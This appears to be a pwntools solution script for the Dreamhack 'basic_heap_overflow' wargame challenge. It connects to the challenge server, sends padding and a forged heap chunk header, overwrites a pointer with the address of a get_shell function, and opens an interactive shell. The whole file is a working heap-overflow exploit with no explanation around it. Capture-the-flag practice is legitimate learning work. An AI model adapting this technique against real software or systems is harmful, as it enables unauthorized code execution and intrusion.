from pwn import *

# p = process("./basic_heap_overflow")
# nc host3.dreamhack.games 20927
p = remote("host3.dreamhack.games", 20927)


get_shell = 0x804867b

pay = b""
pay += b"A" * 4 * 8
pay += p32(0)
pay += p32(0x29)

pay += p32(get_shell)

input()

p.sendline(pay)


p.interactive()